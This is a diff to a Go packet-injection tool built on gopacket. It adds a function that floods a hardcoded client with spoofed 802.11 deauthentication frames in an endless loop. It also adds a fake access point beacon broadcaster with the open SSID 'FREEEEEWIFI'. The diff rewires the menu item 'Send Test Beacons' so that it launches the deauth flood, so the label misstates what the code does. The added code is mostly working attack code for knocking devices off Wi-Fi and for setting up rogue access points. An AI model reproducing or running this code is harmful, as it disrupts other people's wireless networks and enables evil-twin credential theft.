@@ -19,7 +19,7 @@ import (
 )
 
 var (
-	device       string = "wlan0mon"
+	device       string = "wlx00c0caa8a5a3"
 	snapshot_len int32  = 1024
 	promiscuous  bool   = true
 	err          error
@@ -30,7 +30,28 @@ var (
   	options      gopacket.SerializeOptions
 	chartslice 	 []float64
 	averageSignalRate int32 = 0
-	Rates = []byte{0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01}
+	openFlags      = 1057
+	wpaFlags       = 1041
+	durationID     = uint16(0x013a)
+	capabilityInfo = uint16(0x0411)
+	listenInterval = uint16(3)
+	fakeApRates  = []byte{0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01}
+	fakeApWpaRSN = []byte{
+		0x01, 0x00, // RSN Version 1
+		0x00, 0x0f, 0xac, 0x02, // Group Cipher Suite : 00-0f-ac TKIP
+		0x02, 0x00, // 2 Pairwise Cipher Suites (next two lines)
+		0x00, 0x0f, 0xac, 0x04, // AES Cipher / CCMP
+		0x00, 0x0f, 0xac, 0x02, // TKIP Cipher
+		0x01, 0x00, // 1 Authentication Key Management Suite (line below)
+		0x00, 0x0f, 0xac, 0x02, // Pre-Shared Key
+		0x00, 0x00,
+	}
+	wpaSignatureBytes = []byte{0, 0x50, 0xf2, 1}
+
+	assocRates        = []byte{0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c}
+	assocESRates      = []byte{0x0C, 0x12, 0x18, 0x60}
+	assocRSNInfo      = []byte{0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02, 0x8C, 0x00}
+	assocCapabilities = []byte{0x2C, 0x01, 0x03, 0xFF, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}
 )
 
 // DEAUTH ---------------------------------------------------------------------------------------------
@@ -47,22 +68,94 @@ func Serialize(layers ...gopacket.SerializableLayer) (error, []byte) {
 	return nil, buf.Bytes()
 }
 
-func NewDot11Deauth(a1 net.HardwareAddr, a2 net.HardwareAddr, a3 net.HardwareAddr, seq uint16) (error, []byte) {
-	return Serialize(
-		&layers.RadioTap{},
-		&layers.Dot11{
-			Address1:       a1,
-			Address2:       a2,
-			Address3:       a3,
-			Type:           layers.Dot11TypeMgmtDeauthentication,
-			SequenceNumber: seq,
-		},
-		&layers.Dot11MgmtDeauthentication{
-			Reason: layers.Dot11ReasonClass2FromNonAuth,
-		},
-	)
+func NewDot11Deauth() (error, []byte) {
+
+	handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)
+    if err != nil {log.Fatal(err)}
+    defer handle.Close()
+	
+	radio_layer := &layers.RadioTap{
+		DBMAntennaSignal: int8(-10),
+		ChannelFrequency: layers.RadioTapChannelFrequency(2412),
+	}
+	dot11_layer := &layers.Dot11{
+		Address1: net.HardwareAddr{0x60,0xD0,0x2C,0x3C,0x10,0xC8},
+		Address2: net.HardwareAddr{0x48,0xd2,0x24,0x1a,0xcb,0xe8},
+		Address3: net.HardwareAddr{0x48,0xd2,0x24,0x1a,0xcb,0xe8},
+		Type: layers.Dot11TypeMgmtDeauthentication,
+	}
+	auth_layer := &layers.Dot11MgmtDeauthentication{
+		Reason: layers.Dot11ReasonClass2FromNonAuth,
+	}
+	
+	buffer = gopacket.NewSerializeBuffer()
+    gopacket.SerializeLayers(
+      buffer,
+      options,
+      radio_layer,
+      dot11_layer,
+      auth_layer,
+    )
+
+	outgoingPacket := buffer.Bytes()
+
+    for {
+	err = handle.WritePacketData(outgoingPacket)
+	fmt.Print(".")
+	if err != nil {
+	log.Fatal(err)
+	}
+  }
 }
 // DEAUTH --------------------------------------------------------------------------------------------
+
+
+func send_beacons() {
+	flags := openFlags
+
+    //Need high TX card with Atheros chip such as TP-Link
+    handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)
+    if err != nil {log.Fatal(err)}
+    defer handle.Close()
+
+    radioLayer := &layers.RadioTap{
+    	DBMAntennaSignal: int8(-10),
+    	ChannelFrequency: layers.RadioTapChannelFrequency(2412),
+    }
+
+    dot11CoreLayer := &layers.Dot11{
+    Address1: net.HardwareAddr{0xFF,0xFF,0xFF,0xFF,0xFF,0xFF},
+    Address2: net.HardwareAddr{0x60,0xde,0xCA,0xAB,0xFC,0xda},
+    Address3: net.HardwareAddr{0x60,0xde,0xCA,0xAB,0xFC,0xda},
+    Type: 0x08,
+    }
+
+    dot11BeaconLayer := &layers.Dot11MgmtBeacon{
+    		Flags: uint16(flags),
+			Interval: 1000,
+		}
+
+    buffer = gopacket.NewSerializeBuffer()
+    gopacket.SerializeLayers(
+      buffer,
+      options,
+      radioLayer,
+      dot11CoreLayer,
+      dot11BeaconLayer,
+      Dot11Info(layers.Dot11InformationElementIDSSID, []byte("FREEEEEWIFI")),
+      Dot11Info(layers.Dot11InformationElementIDRates, fakeApRates),
+    )
+    outgoingPacket := buffer.Bytes()
+
+     for {
+	err = handle.WritePacketData(outgoingPacket)
+	fmt.Print(".")
+	if err != nil {
+	log.Fatal(err)
+	}
+  }
+}
+
 
 type Dot11ApConfig struct {
 	SSID       string
@@ -71,14 +164,6 @@ type Dot11ApConfig struct {
 	Encryption bool
 }
 
-
-func Serialize(layers ...gopacket.SerializableLayer) (error, []byte) {
-	buf := gopacket.NewSerializeBuffer()
-	if err2 := gopacket.SerializeLayers(buf, SerializationOptions, layers...); err2 != nil {
-		return err2, nil
-	}
-	return nil, buf.Bytes()
-}
 
 
 func Dot11Info(id layers.Dot11InformationElementID, info []byte) *layers.Dot11InformationElement {
@@ -150,7 +235,7 @@ func main() {
 
 	if option_select == "Send Test Beacons" {
 		fmt.Println("Starting...")
-		send_beacons()
+		NewDot11Deauth()
 	}
 
 	if option_select == "Print RTap-Power Chart" {
@@ -237,48 +322,6 @@ func printAChart() {
 }
 
 
-func send_beacons() {
-
-    //Need high TX card with Atheros chip such as TP-Link
-    handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)
-    if err != nil {log.Fatal(err)}
-    defer handle.Close()
-
-    radioLayer := &layers.RadioTap{
-    	DBMAntennaSignal: int8(-10),
-    	ChannelFrequency: layers.RadioTapChannelFrequency(2462),
-    }
-
-    dot11CoreLayer := &layers.Dot11{
-    Address1: net.HardwareAddr{0xFF,0xFF,0xFF,0xFF,0xFF,0xFF},
-    Address2: net.HardwareAddr{0x60,0xde,0xCA,0xAB,0xFC,0xda},
-    Address3: net.HardwareAddr{0x60,0xde,0xCA,0xAB,0xFC,0xda},
-    Type: 0x08,
-    }
-
-    dot11BeaconLayer := &layers.Dot11MgmtBeacon{
-			Interval: 1000,
-		}
-
-    buffer = gopacket.NewSerializeBuffer()
-    gopacket.SerializeLayers(
-      buffer,
-      options,
-      radioLayer,
-      dot11CoreLayer,
-      dot11BeaconLayer,
-      Dot11Info(layers.Dot11InformationElementIDSSID, []byte("FreeWiFi")),
-      Dot11Info(layers.Dot11InformationElementIDRates, Rates),
-    )
-    outgoingPacket := buffer.Bytes()
-
-     for {
-	err = handle.WritePacketData(outgoingPacket)
-	if err != nil {
-	log.Fatal(err)
-	}
-  }
-}
 
 
 func printA() {
